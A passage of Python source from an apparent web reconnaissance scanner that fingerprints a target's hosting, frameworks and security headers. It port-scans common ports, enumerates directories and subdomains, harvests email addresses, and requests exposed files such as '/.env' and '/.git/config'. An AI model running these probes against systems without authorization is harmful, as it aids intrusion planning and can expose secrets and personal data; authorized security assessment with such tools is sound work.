            # 7. Load Balancer Detection
            server_info['load_balancer'] = self._detect_load_balancer(headers)
            
            # 8. Web Application Firewall
            server_info['waf_detected'] = self._detect_waf(headers, content)
            
            # 9. Server Response Time
            server_info['response_time'] = headers.get('X-Response-Time', 'Not provided')
            
            # 10. Hosting Environment Details
            server_info['hosting_environment'] = self._analyze_hosting_environment(headers, content)
            
        except Exception as e:
            self.config.logger.debug(f"Server hosting analysis error: {e}")
        
        return server_info

    async def _analyze_backend_stack(self, headers: Dict, content: str, url: str) -> Dict:
        """🧱 Backend Stack Detection & Analysis"""
        backend_info = {}
        
        try:
            # 1. Programming Language Detection
            backend_info['programming_language'] = self._detect_programming_language(headers, content)
            
            # 2. Web Framework Identification
            backend_info['web_framework'] = self._detect_web_framework(headers, content)
            
            # 3. Database Technology
            backend_info['database_hints'] = self._detect_database_technology(content, headers)
            
            # 4. Application Server
            backend_info['application_server'] = self._detect_application_server(headers)
            
            # 5. API Technology & Endpoints
            backend_info['api_technology'] = self._detect_api_technology(content, headers)
            
            # 6. Session Management
            backend_info['session_management'] = self._analyze_session_management(headers)
            
            # 7. Authentication System
            backend_info['auth_system'] = self._detect_authentication_system(headers, content)
            
            # 8. Caching Strategy
            backend_info['caching_strategy'] = self._analyze_caching_strategy(headers)
            
            # 9. Backend Security Measures
            backend_info['security_measures'] = self._analyze_backend_security(headers, content)
            
            # 10. Microservices Architecture
            backend_info['microservices_indicators'] = self._detect_microservices(headers, content)
            
        except Exception as e:
            self.config.logger.debug(f"Backend stack analysis error: {e}")
        
        return backend_info

    async def _analyze_frontend_stack(self, content: str, headers: Dict) -> Dict:
        """🎨 Frontend Stack Analysis"""
        frontend_info = {}
        
        try:
            # 1. JavaScript Frameworks/Libraries
            frontend_info['js_frameworks'] = self._detect_js_frameworks(content)
            
            # 2. CSS Frameworks & Preprocessors
            frontend_info['css_frameworks'] = self._detect_css_frameworks(content)
            
            # 3. Frontend Build Tools
            frontend_info['build_tools'] = self._detect_build_tools(content)
            
            # 4. Package Managers
            frontend_info['package_managers'] = self._detect_package_managers(content)
            
            # 5. UI Component Libraries
            frontend_info['ui_libraries'] = self._detect_ui_libraries(content)
            
            # 6. Frontend Security Features
            frontend_info['frontend_security'] = self._analyze_frontend_security(content, headers)
            
            # 7. Progressive Web App Features
            frontend_info['pwa_features'] = self._detect_pwa_features(content, headers)
            
            # 8. Single Page Application
            frontend_info['spa_indicators'] = self._detect_spa_indicators(content)
            
            # 9. Frontend Performance Optimizations
            frontend_info['performance_optimizations'] = self._analyze_frontend_performance(content, headers)
            
            # 10. Third-party Integrations
            frontend_info['third_party_integrations'] = self._detect_third_party_integrations(content)
            
        except Exception as e:
            self.config.logger.debug(f"Frontend stack analysis error: {e}")
        
        return frontend_info

    async def _analyze_network_protocol(self, url: str, headers: Dict) -> Dict:
        """🌐 Network & Protocol Analysis"""
        network_info = {}
        
        try:
            # 1. HTTP Version Detection
            network_info['http_version'] = self._detect_http_version(headers)
            
            # 2. Protocol Security Assessment
            network_info['protocol_security'] = self._assess_protocol_security(url, headers)
            
            # 3. Network Latency & Performance
            network_info['network_performance'] = self._analyze_network_performance(headers)
            
            # 4. DNS Configuration
            network_info['dns_config'] = await self._analyze_dns_configuration(url)
            
            # 5. Port Scanning Results
            network_info['open_ports'] = await self._perform_basic_port_scan(url)
            
            # 6. Network Security Headers
            network_info['security_headers'] = await self._analyze_security_headers(headers)
            
            # 7. Compression & Encoding
            network_info['compression_encoding'] = self._analyze_compression(headers)
            
            # 8. Cookie Configuration
            network_info['cookie_analysis'] = self._analyze_cookies(headers)
            
            # 9. CORS Configuration
            network_info['cors_config'] = self._analyze_cors_configuration(headers)
            
            # 10. Network Infrastructure
            network_info['network_infrastructure'] = self._analyze_network_infrastructure(headers)
            
        except Exception as e:
            self.config.logger.debug(f"Network protocol analysis error: {e}")
        
        return network_info

    async def _perform_reconnaissance(self, url: str, content: str, headers: Dict) -> Dict:
        """🕵️ Reconnaissance & Enumeration"""
        recon_info = {}
        
        try:
            # 1. Directory & File Enumeration
            recon_info['directory_enum'] = await self._enumerate_directories(url)
            
            # 2. Subdomain Discovery
            recon_info['subdomain_discovery'] = await self._discover_subdomains(url)
            
            # 3. Email Address Harvesting
            recon_info['email_addresses'] = self._harvest_email_addresses(content)
            
            # 4. Social Media & External Links
            recon_info['external_links'] = self._analyze_external_links(content)
            
            # 5. Technology Fingerprinting
            recon_info['technology_fingerprint'] = self._comprehensive_tech_fingerprint(content, headers)
            
            # 6. Hidden Information Discovery
            recon_info['hidden_information'] = self._discover_hidden_information(content)
            
            # 7. Metadata Extraction
            recon_info['metadata'] = self._extract_metadata(content, headers)
            
            # 8. Error Page Analysis
            recon_info['error_analysis'] = await self._analyze_error_pages(url)
            
            # 9. Backup & Sensitive File Detection
            recon_info['sensitive_files'] = await self._detect_sensitive_files(url)
            
            # 10. Information Disclosure Assessment
            recon_info['information_disclosure'] = self._assess_information_disclosure(content, headers)
            
        except Exception as e:
            self.config.logger.debug(f"Reconnaissance analysis error: {e}")
        
        return recon_info

    # Helper methods for detailed analysis
    def _detect_cloud_provider(self, headers: Dict, content: str) -> str:
        """Detect cloud hosting provider"""
        providers = {
            'AWS': ['amazon', 'aws', 'cloudfront'],
            'Google Cloud': ['gcloud', 'google', 'gcp'],
            'Azure': ['azure', 'microsoft'],
            'Cloudflare': ['cloudflare', 'cf-ray'],
            'DigitalOcean': ['digitalocean'],
            'Heroku': ['heroku']
        }
        
        content_lower = content.lower() if content else ''
        headers_str = str(headers).lower()
        
        for provider, indicators in providers.items():
            if any(indicator in headers_str or indicator in content_lower for indicator in indicators):
                return provider
        
        return 'Unknown'

    def _detect_cdn(self, headers: Dict) -> str:
        """Detect CDN usage"""
        cdn_headers = ['cf-ray', 'x-cache', 'x-served-by', 'x-amz-cf-id']
        for header in cdn_headers:
            if header in headers:
                return f"Detected via {header}"
        return 'Not detected'

    def _detect_load_balancer(self, headers: Dict) -> str:
        """Detect load balancer"""
        lb_indicators = ['x-forwarded-for', 'x-real-ip', 'x-load-balancer']
        for indicator in lb_indicators:
            if indicator in headers:
                return f"Detected via {indicator}"
        return 'Not detected'

    def _detect_waf(self, headers: Dict, content: str) -> str:
        """Detect Web Application Firewall"""
        waf_indicators = {
            'cloudflare': ['cf-ray', 'cloudflare'],
            'akamai': ['akamai'],
            'aws waf': ['aws'],
            'incapsula': ['incap', 'visid_incap']
        }
        
        headers_str = str(headers).lower()
        content_lower = content.lower() if content else ''
        
        for waf, indicators in waf_indicators.items():
            if any(indicator in headers_str or indicator in content_lower for indicator in indicators):
                return waf.title()
        
        return 'Not detected'

    def _analyze_hosting_environment(self, headers: Dict, content: str) -> Dict:
        """Analyze hosting environment details"""
        return {
            'containerized': 'docker' in str(headers).lower() or 'kubernetes' in str(content).lower(),
            'serverless': 'lambda' in str(headers).lower() or 'vercel' in str(headers).lower(),
            'shared_hosting': 'cpanel' in str(content).lower() if content else False
        }

    def _detect_programming_language(self, headers: Dict, content: str) -> str:
        """Detect backend programming language"""
        language_indicators = {
            'PHP': ['php', 'x-powered-by: php', '.php', '<?php'],
            'Python': ['django', 'flask', 'python', 'wsgi'],
            'Java': ['java', 'jsessionid', 'tomcat', 'servlet', 'jsp'],
            'Node.js': ['express', 'node', 'nodejs'],
            'Ruby': ['ruby', 'rails', 'rack'],
            'C#/.NET': ['asp.net', 'aspnet', 'iis', '.aspx'],
            'Go': ['golang', 'go'],
            'Rust': ['rust'],
            'Scala': ['scala', 'akka'],
            'JavaScript': ['javascript', 'js'],
            'TypeScript': ['typescript'],
            'Perl': ['perl', 'cgi']
        }
        
        headers_str = str(headers).lower()
        content_lower = content.lower() if content else ''
        
        # Check X-Powered-By header first (most reliable)
        powered_by = headers.get('X-Powered-By', headers.get('x-powered-by', '')).lower()
        if powered_by:
            if 'php' in powered_by:
                return 'PHP'
            elif 'asp.net' in powered_by:
                return 'C#/.NET'
            elif 'express' in powered_by:
                return 'Node.js'
        
        # Check Server header
        server = headers.get('Server', headers.get('server', '')).lower()
        if server:
            if 'php' in server:
                return 'PHP'
            elif 'tomcat' in server or 'servlet' in server:
                return 'Java'
        
        # Check content for language-specific patterns
        for lang, indicators in language_indicators.items():
            if any(indicator in headers_str or indicator in content_lower for indicator in indicators):
                return lang
        
        return 'Unknown'

    def _detect_web_framework(self, headers: Dict, content: str) -> str:
        """Detect web framework"""
        framework_indicators = {
            'Laravel': ['laravel'],
            'Django': ['django', 'csrf'],
            'Flask': ['flask'],
            'Express.js': ['express'],
            'Spring': ['spring'],
            'Rails': ['rails', 'ruby'],
            'ASP.NET': ['asp.net', 'aspnet'],
            'Symfony': ['symfony'],
            'CodeIgniter': ['codeigniter']
        }
        
        headers_str = str(headers).lower()
        content_lower = content.lower() if content else ''
        
        detected_frameworks = []
        for framework, indicators in framework_indicators.items():
            if any(indicator in headers_str or indicator in content_lower for indicator in indicators):
                detected_frameworks.append(framework)
        
        return ', '.join(detected_frameworks) if detected_frameworks else 'Unknown'

    def _detect_database_technology(self, content: str, headers: Dict) -> List[str]:
        """Detect database technology hints"""
        db_indicators = {
            'MySQL': ['mysql'],
            'PostgreSQL': ['postgres', 'postgresql'],
            'MongoDB': ['mongodb', 'mongo'],
            'Redis': ['redis'],
            'SQLite': ['sqlite'],
            'Oracle': ['oracle'],
            'Microsoft SQL Server': ['mssql', 'sqlserver']
        }
        
        detected_dbs = []
        content_lower = content.lower() if content else ''
        
        for db, indicators in db_indicators.items():
            if any(indicator in content_lower for indicator in indicators):
                detected_dbs.append(db)
        
        return detected_dbs

    def _detect_application_server(self, headers: Dict) -> str:
        """Detect application server"""
        server_indicators = {
            'Apache Tomcat': ['tomcat'],
            'Nginx': ['nginx'],
            'Apache': ['apache'],
            'IIS': ['iis'],
            'Jetty': ['jetty'],
            'Undertow': ['undertow'],
            'Gunicorn': ['gunicorn'],
            'uWSGI': ['uwsgi']
        }
        
        server_header = headers.get('Server', '').lower()
        
        for server, indicators in server_indicators.items():
            if any(indicator in server_header for indicator in indicators):
                return server
        
        return 'Unknown'

    def _detect_api_technology(self, content: str, headers: Dict) -> Dict:
        """Detect API technology and endpoints"""
        api_info = {
            'rest_api': '/api/' in content if content else False,
            'graphql': 'graphql' in content.lower() if content else False,
            'websocket': 'websocket' in content.lower() if content else False,
            'content_type': headers.get('Content-Type', 'Unknown')
        }
        return api_info

    def _analyze_session_management(self, headers: Dict) -> Dict:
        """Analyze session management configuration"""
        cookies = headers.get('Set-Cookie', '')
        return {
            'session_cookies': 'sessionid' in cookies or 'jsessionid' in cookies,
            'secure_flag': 'Secure' in cookies,
            'httponly_flag': 'HttpOnly' in cookies,
            'samesite_attribute': 'SameSite' in cookies
        }

    def _detect_authentication_system(self, headers: Dict, content: str) -> Dict:
        """Detect authentication system"""
        auth_indicators = {
            'oauth': 'oauth' in content.lower() if content else False,
            'saml': 'saml' in content.lower() if content else False,
            'jwt': 'jwt' in content.lower() if content else False,
            'basic_auth': 'WWW-Authenticate' in headers,
            'bearer_token': 'Bearer' in str(headers)
        }
        return auth_indicators

    def _analyze_caching_strategy(self, headers: Dict) -> Dict:
        """Analyze caching strategy"""
        return {
            'cache_control': headers.get('Cache-Control', 'Not set'),
            'etag': headers.get('ETag', 'Not set'),
            'expires': headers.get('Expires', 'Not set'),
            'last_modified': headers.get('Last-Modified', 'Not set')
        }

    def _analyze_backend_security(self, headers: Dict, content: str) -> Dict:
        """Analyze backend security measures"""
        return {
            'csrf_protection': 'csrf' in content.lower() if content else False,
            'xss_protection': headers.get('X-XSS-Protection', 'Not set'),
            'content_type_options': headers.get('X-Content-Type-Options', 'Not set'),
            'frame_options': headers.get('X-Frame-Options', 'Not set')
        }

    def _detect_microservices(self, headers: Dict, content: str) -> Dict:
        """Detect microservices architecture indicators"""
        return {
            'service_mesh': 'istio' in str(headers).lower() or 'envoy' in str(headers).lower(),
            'api_gateway': '/gateway/' in content if content else False,
            'service_discovery': 'consul' in content.lower() if content else False
        }

    def _detect_js_frameworks(self, content: str) -> List[str]:
        """Detect JavaScript frameworks"""
        if not content:
            return []
            
        js_frameworks = {
            'React': ['react', '_reactInternalFiber'],
            'Vue.js': ['vue.js', '__vue__'],
            'Angular': ['angular', 'ng-'],
            'jQuery': ['jquery', '$'],
            'Svelte': ['svelte'],
            'Ember.js': ['ember'],
            'Backbone.js': ['backbone']
        }
        
        detected = []
        content_lower = content.lower()
        
        for framework, indicators in js_frameworks.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(framework)
        
        return detected

    def _detect_css_frameworks(self, content: str) -> List[str]:
        """Detect CSS frameworks"""
        if not content:
            return []
            
        css_frameworks = {
            'Bootstrap': ['bootstrap'],
            'Foundation': ['foundation'],
            'Bulma': ['bulma'],
            'Tailwind CSS': ['tailwind'],
            'Material UI': ['material-ui', 'mui'],
            'Semantic UI': ['semantic-ui']
        }
        
        detected = []
        content_lower = content.lower()
        
        for framework, indicators in css_frameworks.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(framework)
        
        return detected

    def _detect_build_tools(self, content: str) -> List[str]:
        """Detect frontend build tools"""
        if not content:
            return []
            
        build_tools = {
            'Webpack': ['webpack'],
            'Vite': ['vite'],
            'Parcel': ['parcel'],
            'Rollup': ['rollup'],
            'Gulp': ['gulp'],
            'Grunt': ['grunt']
        }
        
        detected = []
        content_lower = content.lower()
        
        for tool, indicators in build_tools.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(tool)
        
        return detected

    def _detect_package_managers(self, content: str) -> List[str]:
        """Detect package managers"""
        if not content:
            return []
            
        package_managers = ['npm', 'yarn', 'pnpm', 'bower']
        detected = []
        content_lower = content.lower()
        
        for pm in package_managers:
            if pm in content_lower:
                detected.append(pm.upper())
        
        return detected

    def _detect_ui_libraries(self, content: str) -> List[str]:
        """Detect UI component libraries"""
        if not content:
            return []
            
        ui_libraries = {
            'Material-UI': ['material-ui', '@mui'],
            'Ant Design': ['antd', 'ant-design'],
            'React Bootstrap': ['react-bootstrap'],
            'Chakra UI': ['chakra-ui'],
            'Mantine': ['mantine']
        }
        
        detected = []
        content_lower = content.lower()
        
        for lib, indicators in ui_libraries.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(lib)
        
        return detected

    def _analyze_frontend_security(self, content: str, headers: Dict) -> Dict:
        """Analyze frontend security features"""
        return {
            'csp_header': headers.get('Content-Security-Policy', 'Not set'),
            'sri_integrity': 'integrity=' in content if content else False,
            'https_enforcement': 'https://' in content if content else False
        }

    def _detect_pwa_features(self, content: str, headers: Dict) -> Dict:
        """Detect Progressive Web App features"""
        if not content:
            return {'manifest': False, 'service_worker': False}
            
        return {
            'manifest': 'manifest.json' in content,
            'service_worker': 'serviceworker' in content.lower() or 'sw.js' in content
        }

    def _detect_spa_indicators(self, content: str) -> bool:
        """Detect Single Page Application indicators"""
        if not content:
            return False
            
        spa_indicators = ['history.pushstate', 'router', 'single-page']
        content_lower = content.lower()
        
        return any(indicator in content_lower for indicator in spa_indicators)

    def _analyze_frontend_performance(self, content: str, headers: Dict) -> Dict:
        """Analyze frontend performance optimizations"""
        return {
            'compression_enabled': 'gzip' in headers.get('Content-Encoding', ''),
            'caching_headers': 'Cache-Control' in headers,
            'minification': '.min.' in content if content else False,
            'lazy_loading': 'lazy' in content if content else False
        }

    def _detect_third_party_integrations(self, content: str) -> List[str]:
        """Detect third-party integrations"""
        if not content:
            return []
            
        integrations = {
            'Google Analytics': ['google-analytics', 'gtag'],
            'Facebook Pixel': ['facebook', 'fbevents'],
            'Stripe': ['stripe'],
            'PayPal': ['paypal'],
            'Disqus': ['disqus'],
            'Zendesk': ['zendesk'],
            'Intercom': ['intercom']
        }
        
        detected = []
        content_lower = content.lower()
        
        for integration, indicators in integrations.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(integration)
        
        return detected

    def _detect_http_version(self, headers: Dict) -> str:
        """Detect HTTP version"""
        if 'HTTP/2' in str(headers) or 'h2' in str(headers):
            return 'HTTP/2'
        elif 'HTTP/3' in str(headers) or 'h3' in str(headers):
            return 'HTTP/3'
        else:
            return 'HTTP/1.1'

    def _assess_protocol_security(self, url: str, headers: Dict) -> Dict:
        """Assess protocol security"""
        return {
            'https_enabled': url.startswith('https://'),
            'hsts_header': 'Strict-Transport-Security' in headers,
            'tls_version': self._detect_tls_version(headers)
        }

    def _detect_tls_version(self, headers: Dict) -> str:
        """Detect TLS version (simplified)"""
        # This would require more sophisticated analysis in practice
        return 'TLS 1.2+' if any('tls' in str(v).lower() for v in headers.values()) else 'Unknown'

    def _analyze_network_performance(self, headers: Dict) -> Dict:
        """Analyze network performance metrics"""
        return {
            'server_timing': headers.get('Server-Timing', 'Not provided'),
            'content_length': headers.get('Content-Length', 'Unknown'),
            'transfer_encoding': headers.get('Transfer-Encoding', 'Standard')
        }

    async def _analyze_dns_configuration(self, url: str) -> Dict:
        """Analyze DNS configuration"""
        domain = urlparse(url).netloc
        dns_info = {'domain': domain}
        
        try:
            # Basic DNS resolution
            ip = socket.gethostbyname(domain)
            dns_info['a_record'] = ip
        except socket.gaierror:
            dns_info['a_record'] = 'Resolution failed'
        
        return dns_info

    async def _perform_basic_port_scan(self, url: str) -> List[int]:
        """Perform basic port scan on common ports"""
        domain = urlparse(url).netloc
        common_ports = [80, 443, 21, 22, 25, 53, 110, 143, 993, 995]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((domain, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                continue
        
        return open_ports

    def _analyze_security_headers(self, headers: Dict) -> Dict:
        """Analyze security headers"""
        security_headers = {
            'X-Frame-Options': headers.get('X-Frame-Options', 'Missing'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'Missing'),
            'X-XSS-Protection': headers.get('X-XSS-Protection', 'Missing'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'Missing'),
            'Content-Security-Policy': headers.get('Content-Security-Policy', 'Missing'),
            'Referrer-Policy': headers.get('Referrer-Policy', 'Missing')
        }
        return security_headers

    def _analyze_compression(self, headers: Dict) -> Dict:
        """Analyze compression and encoding"""
        return {
            'content_encoding': headers.get('Content-Encoding', 'None'),
            'accept_encoding': headers.get('Accept-Encoding', 'Not specified'),
            'vary_header': headers.get('Vary', 'Not set')
        }

    def _analyze_cookies(self, headers: Dict) -> Dict:
        """Analyze cookie configuration"""
        set_cookie = headers.get('Set-Cookie', '')
        return {
            'cookies_present': bool(set_cookie),
            'secure_cookies': 'Secure' in set_cookie,
            'httponly_cookies': 'HttpOnly' in set_cookie,
            'samesite_policy': 'SameSite' in set_cookie
        }

    def _analyze_cors_configuration(self, headers: Dict) -> Dict:
        """Analyze CORS configuration"""
        return {
            'access_control_allow_origin': headers.get('Access-Control-Allow-Origin', 'Not set'),
            'access_control_allow_methods': headers.get('Access-Control-Allow-Methods', 'Not set'),
            'access_control_allow_headers': headers.get('Access-Control-Allow-Headers', 'Not set'),
            'access_control_allow_credentials': headers.get('Access-Control-Allow-Credentials', 'Not set')
        }

    def _analyze_network_infrastructure(self, headers: Dict) -> Dict:
        """Analyze network infrastructure"""
        return {
            'edge_computing': any(edge in str(headers).lower() for edge in ['cloudflare', 'fastly', 'akamai']),
            'proxy_detected': 'X-Forwarded-For' in headers or 'X-Real-IP' in headers,
            'load_balancing': 'X-Load-Balancer' in headers
        }

    async def _enumerate_directories(self, url: str) -> List[str]:
        """Enumerate common directories"""
        common_dirs = ['/admin', '/api', '/backup', '/config', '/test', '/dev']
        found_dirs = []
        
        for directory in common_dirs:
            try:
                test_url = url.rstrip('/') + directory
                result = await self.session.get(test_url)
                if result[0] and result[0] not in [404, 403]:
                    found_dirs.append(directory)
            except:
                continue
        
        return found_dirs

    async def _discover_subdomains(self, url: str) -> List[str]:
        """Discover subdomains (basic implementation)"""
        domain = urlparse(url).netloc
        common_subdomains = ['www', 'api', 'admin', 'mail', 'ftp', 'blog', 'shop']
        found_subdomains = []
        
        for subdomain in common_subdomains:
            try:
                test_domain = f"{subdomain}.{domain}"
                socket.gethostbyname(test_domain)
                found_subdomains.append(test_domain)
            except socket.gaierror:
                continue
        
        return found_subdomains

    def _harvest_email_addresses(self, content: str) -> List[str]:
        """Harvest email addresses from content"""
        if not content:
            return []
            
        import re
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, content)
        return list(set(emails))  # Remove duplicates

    def _analyze_external_links(self, content: str) -> Dict:
        """Analyze external links and social media presence"""
        if not content:
            return {}
            
        import re
        
        # Extract external links
        link_pattern = r'https?://(?:www\.)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
        external_domains = re.findall(link_pattern, content)
        
        # Social media detection
        social_media = {
            'facebook': 'facebook.com' in content,
            'twitter': 'twitter.com' in content or 'x.com' in content,
            'linkedin': 'linkedin.com' in content,
            'instagram': 'instagram.com' in content,
            'youtube': 'youtube.com' in content
        }
        
        return {
            'external_domains': list(set(external_domains)),
            'social_media': social_media
        }

    def _comprehensive_tech_fingerprint(self, content: str, headers: Dict) -> Dict:
        """Comprehensive technology fingerprinting"""
        return {
            'cms_detected': self._detect_cms(content, headers),
            'analytics_tools': self._detect_analytics(content),
            'advertising_networks': self._detect_advertising(content),
            'cdn_services': self._detect_cdn_services(content, headers)
        }

    def _detect_cms(self, content: str, headers: Dict) -> str:
        """Detect Content Management System"""
        if not content:
            return 'Unknown'
            
        cms_indicators = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Drupal': ['drupal', '/sites/default/'],
            'Joomla': ['joomla', '/components/'],
            'Magento': ['magento', 'mage/'],
            'Shopify': ['shopify', 'cdn.shopify'],
            'Squarespace': ['squarespace'],
            'Wix': ['wix.com'],
            'Ghost': ['ghost']
        }
        
        content_lower = content.lower()
        headers_str = str(headers).lower()
        
        for cms, indicators in cms_indicators.items():
            if any(indicator in content_lower or indicator in headers_str for indicator in indicators):
                return cms
        
        return 'Unknown'

    def _detect_analytics(self, content: str) -> List[str]:
        """Detect analytics tools"""
        if not content:
            return []
            
        analytics_tools = {
            'Google Analytics': ['google-analytics', 'gtag', 'ga('],
            'Adobe Analytics': ['adobe', 'omniture'],
            'Hotjar': ['hotjar'],
            'Mixpanel': ['mixpanel'],
            'Segment': ['segment.com']
        }
        
        detected = []
        content_lower = content.lower()
        
        for tool, indicators in analytics_tools.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(tool)
        
        return detected

    def _detect_advertising(self, content: str) -> List[str]:
        """Detect advertising networks"""
        if not content:
            return []
            
        ad_networks = {
            'Google AdSense': ['googlesyndication', 'adsense'],
            'Google Ad Manager': ['doubleclick'],
            'Facebook Ads': ['facebook.com/tr'],
            'Amazon Associates': ['amazon-adsystem']
        }
        
        detected = []
        content_lower = content.lower()
        
        for network, indicators in ad_networks.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(network)
        
        return detected

    def _detect_cdn_services(self, content: str, headers: Dict) -> List[str]:
        """Detect CDN services"""
        cdn_services = ['cloudflare', 'fastly', 'maxcdn', 'keycdn', 'jsdelivr', 'unpkg']
        detected = []
        
        content_lower = content.lower() if content else ''
        headers_str = str(headers).lower()
        
        for cdn in cdn_services:
            if cdn in content_lower or cdn in headers_str:
                detected.append(cdn.title())
        
        return detected

    def _discover_hidden_information(self, content: str) -> Dict:
        """Discover hidden information in content"""
        if not content:
            return {}
            
        return {
            'comments_found': '<!--' in content,
            'debug_info': any(debug in content.lower() for debug in ['debug', 'trace', 'error']),
            'version_info': any(version in content.lower() for version in ['version', 'v1.', 'v2.']),
            'api_keys_exposed': any(key in content.lower() for key in ['api_key', 'secret', 'token'])
        }

    def _extract_metadata(self, content: str, headers: Dict) -> Dict:
        """Extract metadata from content and headers"""
        metadata = {
            'last_modified': headers.get('Last-Modified', 'Not provided'),
            'etag': headers.get('ETag', 'Not provided'),
            'content_type': headers.get('Content-Type', 'Not provided')
        }
        
        if content:
            import re
            # Extract meta tags
            meta_pattern = r'<meta\s+(?:name|property)=["\']([^"\']+)["\'].*?content=["\']([^"\']+)["\']'
            meta_tags = re.findall(meta_pattern, content, re.IGNORECASE)
            metadata['meta_tags'] = dict(meta_tags)
        
        return metadata

    async def _analyze_error_pages(self, url: str) -> Dict:
        """Analyze error pages for information disclosure"""
        error_info = {}
        
        try:
            # Test 404 page
            error_url = url.rstrip('/') + '/nonexistent-page-' + str(hash(url))[-6:]
            result = await self.session.get(error_url)
            if result[0] == 404 and result[2]:
                error_info['404_page_info'] = len(result[2]) > 1000  # Verbose error page
        except:
            pass
        
        return error_info

    async def _detect_sensitive_files(self, url: str) -> List[str]:
        """Detect sensitive files and backups"""
        sensitive_files = [
            '/robots.txt', '/sitemap.xml', '/.env', '/config.php',
            '/backup.zip', '/database.sql', '/.git/config'
        ]
        
        found_files = []
        for file_path in sensitive_files:
            try:
                test_url = url.rstrip('/') + file_path
                result = await self.session.get(test_url)
                if result[0] and result[0] == 200:
                    found_files.append(file_path)
            except:
                continue
        
        return found_files

    def _assess_information_disclosure(self, content: str, headers: Dict) -> Dict:
        """Assess information disclosure risks"""
        return {
            'server_version_disclosed': any(server in headers.get('Server', '') for server in ['Apache/', 'nginx/', 'IIS/']),
            'powered_by_disclosed': 'X-Powered-By' in headers,
            'directory_listing': 'Index of /' in content if content else False,
            'stack_traces': any(trace in content.lower() if content else False for trace in ['traceback', 'stack trace', 'exception'])
        }

    # === Enhanced Reconnaissance & Vulnerability Scanning Methods ===

    async def _advanced_shodan_reconnaissance(self, url: str) -> Dict:
        """Enhanced Shodan reconnaissance for comprehensive intelligence gathering"""
        if not SHODAN_AVAILABLE:
            return {'error': 'Shodan library not available'}
        
        try:
            domain = urlparse(url).netloc
            ip_address = socket.gethostbyname(domain)
            
            # Note: Requires SHODAN_API_KEY environment variable
            api_key = os.getenv('SHODAN_API_KEY')
            if not api_key:
                return {'info': 'Shodan API key not configured'}
            
            api = shodan.Shodan(api_key)
            
            # Comprehensive Shodan intelligence
            host_info = api.host(ip_address)
            
            return {
                'ip': ip_address,
                'organization': host_info.get('org', 'Unknown'),
                'country': host_info.get('country_name', 'Unknown'),
                'city': host_info.get('city', 'Unknown'),
                'isp': host_info.get('isp', 'Unknown'),
                'asn': host_info.get('asn', 'Unknown'),
                'open_ports': [service['port'] for service in host_info.get('data', [])],
                'services': [f"{service.get('product', 'Unknown')} {service.get('version', '')}" 
                           for service in host_info.get('data', [])],
                'vulnerabilities': host_info.get('vulns', []),
                'last_update': host_info.get('last_update', 'Unknown'),
                'hostnames': host_info.get('hostnames', [])
            }
        except Exception as e:
            self.config.logger.debug(f"Shodan reconnaissance error: {e}")
            return {'error': str(e)}

    async def _advanced_whois_analysis(self, url: str) -> Dict:
        """Enhanced WHOIS analysis for domain intelligence"""
        if not WHOIS_AVAILABLE:
            return {'error': 'WHOIS library not available'}
        
        try:
            domain = urlparse(url).netloc
            whois_info = whois.whois(domain)
            
            return {
                'domain_name': whois_info.domain_name if hasattr(whois_info, 'domain_name') else 'Unknown',
                'registrar': whois_info.registrar if hasattr(whois_info, 'registrar') else 'Unknown',
                'creation_date': str(whois_info.creation_date) if hasattr(whois_info, 'creation_date') else 'Unknown',
                'expiration_date': str(whois_info.expiration_date) if hasattr(whois_info, 'expiration_date') else 'Unknown',
                'name_servers': whois_info.name_servers if hasattr(whois_info, 'name_servers') else [],
                'status': whois_info.status if hasattr(whois_info, 'status') else 'Unknown',
                'country': whois_info.country if hasattr(whois_info, 'country') else 'Unknown',
                'organization': whois_info.org if hasattr(whois_info, 'org') else 'Unknown'
            }
        except Exception as e:
            self.config.logger.debug(f"WHOIS analysis error: {e}")
            return {'error': str(e)}

    async def _advanced_technology_detection(self, url: str) -> Dict:
        """Enhanced technology detection using BuiltWith"""
        if not BUILTWITH_AVAILABLE:
            return {'error': 'BuiltWith library not available'}
        
        try:
            domain = urlparse(url).netloc
            tech_info = builtwith.parse(url)
            
            return {
                'web_servers': tech_info.get('web-servers', []),
                'programming_languages': tech_info.get('programming-languages', []),
                'javascript_frameworks': tech_info.get('javascript-frameworks', []),
                'cms': tech_info.get('cms', []),
                'analytics': tech_info.get('analytics', []),
                'advertising': tech_info.get('advertising', []),
                'cdn': tech_info.get('cdn', []),
                'ssl_certificates': tech_info.get('ssl-certificates', []),
                'hosting': tech_info.get('hosting', []),
                'payment_processors': tech_info.get('payment-processors', [])
            }
        except Exception as e:
            self.config.logger.debug(f"Technology detection error: {e}")
            return {'error': str(e)}

    async def _wayback_machine_analysis(self, url: str) -> Dict:
        """Historical URL analysis using Wayback Machine"""
        if not WAYBACK_AVAILABLE:
            return {'error': 'Wayback library not available'}
        
        try:
            wayback = waybackpy.Url(url, "DuskProbe/5.0")
            
            # Get historical snapshots
            snapshots = []
            try:
                for snapshot in wayback.snapshots():
                    snapshots.append({
                        'timestamp': str(snapshot.timestamp),
                        'archive_url': snapshot.archive_url
                    })
                    if len(snapshots) >= 10:  # Limit to recent 10 snapshots
                        break
            except:
                pass
            
            return {
                'total_snapshots': len(snapshots),
                'recent_snapshots': snapshots,
                'oldest_snapshot': wayback.oldest().timestamp if snapshots else None,
                'newest_snapshot': wayback.newest().timestamp if snapshots else None
            }
        except Exception as e:
            self.config.logger.debug(f"Wayback analysis error: {e}")
            return {'error': str(e)}

    async def _advanced_dns_reconnaissance(self, url: str) -> Dict:
        """Enhanced DNS reconnaissance using dnspython"""
        if not DNS_AVAILABLE:
            return {'error': 'DNS library not available'}
        
        try:
            domain = urlparse(url).netloc
            dns_info = {}
            
            # Common DNS record types
